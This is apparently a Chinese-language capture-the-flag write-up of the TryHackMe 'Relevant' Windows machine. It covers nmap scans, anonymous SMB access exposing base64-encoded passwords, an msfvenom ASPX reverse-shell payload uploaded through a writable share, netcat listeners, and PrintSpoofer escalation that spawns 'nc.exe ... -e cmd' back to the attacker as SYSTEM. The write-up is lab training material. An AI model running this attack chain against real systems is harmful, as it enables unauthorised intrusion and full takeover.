<span style="font-size: 40px; font-weight: bold;">Relevant</span>

<div style="text-align: right;">

date: "2024-01-20"

</div>

# 1. 端口探测

探测开放端口及详细信息

```shell
C:\Users\ME\Desktop
# nmap --reason -p- --min-rate 10000 10.10.155.150
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-20 19:58 中国标准时间
Nmap scan report for 10.10.155.150
Host is up, received echo-reply ttl 127 (0.36s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49663/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49669/tcp open  unknown       syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 20.27 seconds

C:\Users\ME\Desktop
# nmap -p 80,135,139,445,3389,49663,49667,49669 10.10.155.150 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-20 19:59 中国标准时间

Nmap scan report for 10.10.155.150
Host is up (0.27s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-01-19T11:54:23
|_Not valid after:  2024-07-20T11:54:23
|_ssl-date: 2024-01-20T12:02:35+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-01-20T12:00:40+00:00
49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
49667/tcp open  msrpc         Microsoft Windows RPC
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
49669/tcp open  msrpc         Microsoft Windows RPC
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb2-time:
|   date: 2024-01-20T12:00:38
|_  start_date: 2024-01-20T11:55:15
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.98 seconds
```

发现存在 SMB 匿名访问

# 2. SMB 匿名访问

我们对 `nt4wrksv` 存在读写权限，使用 `smbclient` 连接后访问其中文件，发现 `passwords.txt`，利用文件内 Base64 解码后的账户密码尝试 SMB 横向及 RDP 登录均失败

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ ./nxc smb 10.10.155.150 -u ' ' -p ' ' --shares
SMB         10.10.155.150   445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.155.150   445    RELEVANT         [+] Relevant\ :
SMB         10.10.155.150   445    RELEVANT         [*] Enumerated shares
SMB         10.10.155.150   445    RELEVANT         Share           Permissions     Remark
SMB         10.10.155.150   445    RELEVANT         -----           -----------     ------
SMB         10.10.155.150   445    RELEVANT         ADMIN$                          Remote Admin
SMB         10.10.155.150   445    RELEVANT         C$                              Default share
SMB         10.10.155.150   445    RELEVANT         IPC$                            Remote IPC
SMB         10.10.155.150   445    RELEVANT         nt4wrksv        READ,WRITE

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient \\\\10.10.155.150\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 20 07:28:03 2024
  ..                                  D        0  Sat Jan 20 07:28:03 2024
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4943588 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~/Desktop]
└─$ cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

┌──(kali㉿kali)-[~/Desktop]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123

┌──(kali㉿kali)-[~/Desktop]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
┌──(kali㉿kali)-[~/Desktop]
└─$ ./nxc smb 10.10.155.150 -u 'Bob' -p '!P@$$W0rD!123'
SMB         10.10.217.224   445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.217.224   445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123

┌──(kali㉿kali)-[~/Desktop]
└─$ ./nxc smb 10.10.155.150 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
SMB         10.10.217.224   445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.217.224   445    RELEVANT         [+] Relevant\Bill:Juw4nnaM4n420696969!$$$
```

# 3. 反弹 shell

目录爆破到存在目录：`http://10.10.217.224:49663/nt4wrksv/`，访问为空白页面，结合到之前 SMB 共享，尝试访问 `http://10.10.217.224:49663/nt4wrksv/passwords.txt` ，发现存在，可以通过 SMB 端口进行反向连接 shell。

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.2.147 LPORT=2333 -f aspx > 1.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3425 bytes

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient \\\\10.10.155.150\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put 1.aspx
putting file 1.aspx as \1.aspx (5.1 kb/s) (average 27.5 kb/s)
```

获取 shell 后发现目前用户 iis，一般 iis 都会拥有 [SeImpersonatePrivilege](/docs/knowledge/domain_penetration/Windows/Windows用户权限.md) 权限，可以利用 `potato` 进行提权

```shell
C:\Users\ME\Desktop\常用漏洞检测工具\内网\内网穿透\netcat-1.11
# nc.exe -lvvp 2333
listening on [any] 2333 ...
10.10.155.150: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [10.8.2.147] from (UNKNOWN) [10.10.155.150] 49899: NO_DATA
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\windows\system32\inetsrv>type c:\users\bob\desktop\user.txt
type c:\users\bob\desktop\user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

# 4. 提权

使用 `PrintSpoofer` 结合 `nc` 反弹一个 SYSTEM 权限

```shell
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -c "c:\inetpub\wwwroot\nt4wrksv\nc.exe 10.8.2.147 9981 -e cmd"
PrintSpoofer.exe -c "c:\inetpub\wwwroot\nt4wrksv\nc.exe 10.8.2.147 9981 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

C:\Users\ME\Desktop\常用漏洞检测工具\内网\内网穿透\netcat-1.11
# nc.exe -lvvp 9981
listening on [any] 9981 ...
10.10.217.224: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [10.8.2.147] from (UNKNOWN) [10.10.155.150] 49742: NO_DATA
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
C:\Windows\system32>
```

# 5. 总结

1. 第一次使用MSF生成的ASPX文件进行反弹shell
2. 第一次结合SMB共享漏洞进行利用
3. 以后靶场尽量使用手工方式打，拒绝脚本小子
